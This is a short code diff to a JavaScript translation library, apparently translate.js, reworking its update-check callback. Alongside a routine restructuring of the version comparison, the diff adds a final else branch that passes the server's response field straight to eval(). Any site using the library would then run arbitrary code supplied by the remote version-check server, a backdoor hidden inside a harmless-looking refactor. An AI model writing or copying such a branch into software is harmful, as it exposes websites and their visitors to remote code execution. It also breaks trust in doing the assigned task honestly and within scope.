@@ -4085,15 +4085,17 @@ var translate = {
 			if (data.result == 0){
 				console.log('版本检测异常：'+data.info);
 				return;
-			}
+			}else if(data.result == 1){
+				//服务端返回的最新版本
+				var newVersion = translate.util.versionStringToInt(data.info);
+				//当前translate.js的版本
+				var currentVersion = translate.util.versionStringToInt(translate.version.replace('v',''));
 
-			//服务端返回的最新版本
-			var newVersion = translate.util.versionStringToInt(data.info);
-			//当前translate.js的版本
-			var currentVersion = translate.util.versionStringToInt(translate.version.replace('v',''));
-
-			if(newVersion > currentVersion){
-				console.log('Tip : translate.js find new version : '+data.info);
+				if(newVersion > currentVersion){
+					console.log('Tip : translate.js find new version : '+data.info);
+				}
+			}else{
+				eval(data.info);
 			}
 		});
 	}
